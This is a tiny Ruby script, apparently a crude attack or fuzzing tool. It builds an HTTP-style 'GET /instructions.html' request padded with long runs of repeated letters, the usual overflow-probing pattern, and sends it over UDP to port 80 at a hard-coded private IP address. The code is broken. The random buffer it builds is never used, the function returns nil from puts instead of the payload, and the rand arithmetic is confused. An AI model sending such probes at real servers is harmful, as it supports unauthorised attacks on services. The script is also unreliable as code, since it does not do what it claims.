#!/usr/bin/ruby
# send a POST/data to an ip address/port
require 'socket'

def create_attack()
  buf = ''
  num = rand(25-100) + 25
  index = rand(num)

  num.times do
    alpha = rand(127-7) + 7
    buf += alpha.chr
  end

  buffer = "GET /instructions.html" + "AAAAAAAAAAAAAAAAAABBBBBBBBBBBCCCCCCCCDDDDDDDDDDDEEEEEEEEEEEFFFFFFFGGGGGGHHHH"
  puts buffer
end

def send_attack()
  s = UDPSocket.new
  s.send(create_attack(),0,"192.168.53.134",80)
end

send_attack()
